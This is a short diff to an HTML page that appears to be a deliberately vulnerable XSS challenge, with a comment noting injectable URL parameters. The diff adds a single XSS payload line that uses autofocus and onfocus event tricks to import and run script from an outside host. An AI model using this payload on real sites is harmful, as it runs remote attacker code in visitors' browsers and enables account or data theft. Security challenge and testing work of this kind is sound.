@@ -1,4 +1,4 @@
-
+<<https:xx.is/onfocus=1?import(tagName):1+AutoFocus+ContentEditable>>
 <!DOCTYPE html>
 <head>
 <!-- XSS in 11 URL parameters (a, b1, b2, b3, b4, c1, c2, c3, c4, c5 and c6) + URL itself -->
